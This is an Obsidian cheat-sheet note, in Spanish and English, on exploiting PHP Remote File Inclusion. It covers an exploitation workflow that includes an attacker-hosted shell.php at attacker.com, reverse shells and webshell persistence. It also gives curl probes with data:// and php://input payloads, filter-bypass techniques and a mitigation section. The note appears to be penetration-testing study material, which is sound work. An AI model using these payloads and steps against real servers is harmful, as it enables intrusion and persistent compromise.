---
aliases:
  - RFI
  - Remote File Inclusion
  - RFI - Remote File Inclusion
tags:
  - vuln/rfi
  - technique/execution
  - technique/initial-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: CheatSheet
linked:
  - "[[RFI - Vectores Basicos]]"
  - "[[RFI - PHP Wrappers y Schemes]]"
  - "[[RFI - Bypass de Filtros]]"
  - "[[RFI - Hostear Payload Remote]]"
  - "[[RFI - Tooling]]"
  - "[[File Inclusion]]"
  - "[[Insecure Deserialization]]"
  - "[[Burp Suite]]"
---
# Remote File Inclusion (RFI)

***

## Cheatsheet

### 🎯 Vectores Básicos

````tabs
tab: **HTTP / HTTPS Remote Inclusion**
![[RFI - Vectores Basicos#^rfi-vector-http]]

tab: **FTP / SMB Schemes**
![[RFI - Vectores Basicos#^rfi-vector-ftp]]

tab: **Raw URL Inclusion**
![[RFI - Vectores Basicos#^rfi-vector-raw]]

tab: **Combine con Local Upload**
![[RFI - Vectores Basicos#^rfi-vector-local-upload]]
````

### 📡 PHP Wrappers y Schemes

````tabs
tab: **`data://` URI**
![[RFI - PHP Wrappers y Schemes#^rfi-wrapper-data]]

tab: **`php://input` (POST Body)**
![[RFI - PHP Wrappers y Schemes#^rfi-wrapper-input]]

tab: **`expect://` (RCE Direct)**
![[RFI - PHP Wrappers y Schemes#^rfi-wrapper-expect]]

tab: **`phar://` Deserialization**
![[RFI - PHP Wrappers y Schemes#^rfi-wrapper-phar]]

tab: **`ssh2://` y Otros**
![[RFI - PHP Wrappers y Schemes#^rfi-wrapper-ssh2]]
````

### 🔓 Bypass de Filtros

````tabs
tab: **Whitelist Domain Bypass**
![[RFI - Bypass de Filtros#^rfi-bypass-whitelist]]

tab: **Null Byte Truncation**
![[RFI - Bypass de Filtros#^rfi-bypass-nullbyte]]

tab: **Query String Trick (`?page=...?`)**
![[RFI - Bypass de Filtros#^rfi-bypass-query]]

tab: **URL Encoding**
![[RFI - Bypass de Filtros#^rfi-bypass-encoding]]

tab: **Open Redirect Chain**
![[RFI - Bypass de Filtros#^rfi-bypass-open-redirect]]
````

### 🏴 Hostear Payload Remote

````tabs
tab: **Webshell Setup Atacante**
![[RFI - Hostear Payload Remote#^rfi-host-setup]]

tab: **Polyglot Files**
![[RFI - Hostear Payload Remote#^rfi-host-polyglot]]

tab: **Public Payload Servers**
![[RFI - Hostear Payload Remote#^rfi-host-public]]

tab: **DNS Rebinding**
![[RFI - Hostear Payload Remote#^rfi-host-dnsrebind]]
````

### 🛠️ Tooling

````tabs
tab: **LFISuite RFI Mode**
![[RFI - Tooling#^rfi-tool-lfisuite]]

tab: **Burp Intruder + Payloads**
![[RFI - Tooling#^rfi-tool-burp]]

tab: **Manual curl Scripts**
![[RFI - Tooling#^rfi-tool-curl]]

tab: **Wordlists**
![[RFI - Tooling#^rfi-tool-wordlists]]

tab: **Otros Tools**
![[RFI - Tooling#^rfi-tool-others]]
````

___

## Overview

**Remote File Inclusion (RFI)** = atacante hace que app PHP incluya archivo remoto desde URL controlada (`http://attacker.com/shell.php`). Cuando `include()` o `require()` recibe URL remota como argumento + `allow_url_include = On`, PHP interpreta archivo remoto como código local → **RCE inmediato**.

Vector más severo de file inclusion porque salta el upload step necesario en LFI-to-RCE chains. Sin embargo, mucho menos común que LFI porque `allow_url_include = Off` es default desde PHP 5.2.0.

OWASP Top 10 — A03:2021 Injection. CWE-98. Vector clase A pero raro en stacks modernos.

### Por qué RFI es más raro

PHP 5.2.0 (2006) cambió `allow_url_include` de `On` a `Off` por default. Apps modernos:
- Disable explicitly en `php.ini`.
- Filtros de URL en input.
- WAF rules anti-RFI.

Encontrado mostly en:
- Legacy PHP apps pre-2006 sin actualización.
- Misconfigured shared hosting con `allow_url_include = On`.
- Custom apps que no auditan config.
- Forks de software legacy.

### Diferencia con LFI / Path Traversal

| | **RFI** | **LFI** | **Path Traversal** |
|---|---|---|---|
| File source | URL remota | Local filesystem | Local filesystem |
| Mechanism | `include()` + URL | `include()` + path | `read()` con path |
| Required | `allow_url_include = On` | `allow_url_fopen = On` (varies) | None |
| Result | RCE direct | Disclosure (RCE if log poison + chain) | Disclosure mostly |
| PHP-specific | Yes (mostly) | PHP common, others adjacent | Language-agnostic |

### Diferencia con SSI Injection

| | **RFI** | **SSI** |
|---|---|---|
| Trigger | PHP `include()` con URL | mod_include `<!--#exec ... -->` |
| Stack | PHP | Apache/IIS mod_include |
| Required | `allow_url_include = On` | `Options +Includes` |
| Vector | URL parameter | Reflected SSI directives |

___

## Workflow de explotación

```
1. Identificar endpoints vulnerables:
   - ?page=, ?file=, ?include=, ?template=
   - Source: include() / require() with user input

2. Confirm PHP stack:
   - X-Powered-By, PHPSESSID
   - phpinfo() probe

3. Test RFI capability:
   - Probe con http://collaborator.oast.fun/x
   - Watch callback dashboard

4. If RFI works:
   a. Setup attacker server (python -m http.server 80)
   b. Host shell.php
   c. Trigger via ?page=http://attacker.com/shell.php
   d. RCE confirmed

5. If RFI fails (allow_url_include = Off):
   a. Try data:// (allow_url_include required)
   b. Try php://input (allow_url_include required)
   c. Try expect:// (extension required)
   d. Try phar:// (deserialization combo)
   e. Fallback to LFI con log poisoning chain

6. If filter blocks URL:
   a. Whitelist bypass (subdomain, userinfo, etc)
   b. Null byte truncation (legacy)
   c. Query string trick (?page=...?)
   d. URL encoding
   e. Open Redirect chain

7. Escalation:
   a. Reverse shell
   b. Webshell drop persistent
   c. Combine con SDT for stealth
   d. Combine con DNS rebinding for filter bypass
```

___

## Detección rápida

### Indicadores en código backend

```php
// PHP — VULN (allow_url_include = On + include user input)
<?php
include($_GET['page'] . '.php');  // ← BAD
?>

// PHP — SAFE (whitelist)
<?php
$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . '.php');
}
?>

// PHP — SAFE (config)
// php.ini:
// allow_url_include = Off
// allow_url_fopen = Off
```

### Probes mínimos

```bash
TARGET="https://target/index.php"
PARAM="page"

# 1. Confirm PHP stack
curl -sI "$TARGET" | grep -i 'x-powered-by'

# 2. Test RFI con Collaborator
COLLAB=$(./interactsh-client -url-only)
curl -s "${TARGET}?${PARAM}=http://${COLLAB}/test"
# Watch dashboard for callback

# 3. data:// alternative
PAYLOAD='<?php phpinfo(); ?>'
B64=$(echo -n "$PAYLOAD" | base64)
curl -s "${TARGET}?${PARAM}=data://text/plain;base64,${B64}"
# Response should include phpinfo() output

# 4. php://input
curl -X POST -d '<?php phpinfo(); ?>' \
  -H "Content-Type: text/plain" \
  "${TARGET}?${PARAM}=php://input"

# 5. Auto-tooling
python LFISuite.py -u "${TARGET}?${PARAM}=" --auto-rfi
```

___

## Impacto

- **RCE inmediato** — atacante's code executes en webserver context.
- **Reverse shell** — interactive shell.
- **Webshell drop persistencia** — long-term access.
- **Privesc local** — combine con kernel exploits.
- **Lateral movement** — internal network access.
- **Data exfil** — read sensitive files.
- **Database compromise** — DB credentials usually accessible.
- **Persistencia** — cron jobs, SSH keys, services.
- **Compliance failure** — RCE = critical CVSS.
- **Combine con Subdomain Takeover** — atacante's payload trusted-looking.
- **Combine con DNS rebinding** — filter bypass.
- **Combine con `phar://`** — even sin URL fetch, deserialization gadgets.

___

## Mitigación (defender)

- **Disable `allow_url_include`**:
  ```ini
  ; php.ini
  allow_url_include = Off
  allow_url_fopen = Off
  ```
- **Disable `allow_url_fopen` en shared hosting** — defense en depth.
- **Don't include user input directly**:
  ```php
  // BAD
  include($_GET['page']);
  
  // GOOD
  $allowed = ['home', 'about'];
  $page = in_array($_GET['page'], $allowed) ? $_GET['page'] : 'home';
  include('pages/' . $page . '.php');
  ```
- **Whitelist file paths** — never trust user input directly.
- **Disable peligrous PHP functions**:
  ```ini
  disable_functions = exec, system, passthru, shell_exec, popen, proc_open, eval, assert, expect_popen
  ```
- **Restrict `data://` if not needed** — `disable_functions` doesn't catch.
- **`open_basedir` restriction**:
  ```ini
  open_basedir = /var/www/html:/tmp
  ```
- **WAF anti-RFI rules** — ModSecurity OWASP CRS.
- **Audit `allow_url_include` flag periodically**.
- **Use modern PHP** — PHP 8+ con strict modes.
- **Code review** — flag all `include()`/`require()` con user input.
- **Static analysis** — Phan, Psalm, RIPS detect this pattern.
- **Web server hardening** — separate users, SELinux/AppArmor, sandboxing.

___

## Para entender RFI

**Por qué `allow_url_include` exists:**

PHP `include()` originalmente acepta cualquier path/URL. Útil para devs que quieren includes from CDN, etc. Vector tan severo (instant RCE) que default cambió a `Off` en 5.2.0. Pero some legacy apps depend on it, so flag persists.

**Por qué `data://` y `php://input` requieren mismo flag:**

Both bypass external network fetch but use same `allow_url_include` flag for consistency. Disabling one disables all URL-style includes.

**Diferencia entre RFI y SSRF:**

- RFI: PHP includes content como código → RCE.
- SSRF: PHP fetches URL but doesn't execute → file read / internal access.

Both are "server-side fetch" but RFI implies execution context.

**Por qué chains son comunes:**

Pure RFI rare (allow_url_include off). But:
- LFI + log poisoning → execute injected PHP en logs.
- LFI + upload + include → execute uploaded shell.
- Phar:// + upload + LFI → deserialization → RCE.

Each chain reaches RCE through different mechanisms.

**Stack-specific behavior:**

PHP es el primary stack. Java `getResource()`, Python `import` con dynamic strings, Node `require()` con user input — adjacent vulns but different flag names. Concept of "remote include = RCE" generalizes.

___

## Recursos

- [PortSwigger - File Inclusion](https://portswigger.net/web-security/file-path-traversal) — labs.
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) — payloads.
- [HackTricks - LFI / RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion) — referencia.
- [OWASP - Testing for File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion) — methodology.
- [LFISuite](https://github.com/D35m0nd142/LFISuite) — auto-exploit.
- [PHPGGC - Phar payload generator](https://github.com/ambionics/phpggc) — Phar combo.
- [PHP Wrappers and Streams](https://www.php.net/manual/en/wrappers.php) — PHP docs reference.
- [CWE-98 - Improper Control of Filename for Include/Require](https://cwe.mitre.org/data/definitions/98.html) — MITRE.
- [PHP Security - Filesystem](https://www.php.net/manual/en/security.filesystem.php) — official guide.

***
